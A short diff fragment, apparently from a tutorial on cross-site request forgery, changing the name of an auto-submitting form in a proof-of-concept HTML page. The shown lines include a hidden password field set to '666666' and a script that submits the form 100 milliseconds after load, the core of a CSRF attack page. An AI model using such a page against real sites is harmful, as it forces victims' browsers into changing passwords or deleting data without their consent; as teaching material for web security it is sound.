@@ -80,7 +80,7 @@ http://www.aa.com/opt.php?id=135&act=del&name=Tom的链接
         <input type="hidden" name="rpasswd" id="rpasswd" value="666666">
     </form>
     <script>
-        setTimeout("document.form8320.submit()",100);
+        setTimeout("document.csrf.submit()",100);
     </script>
 </body>
 </html>
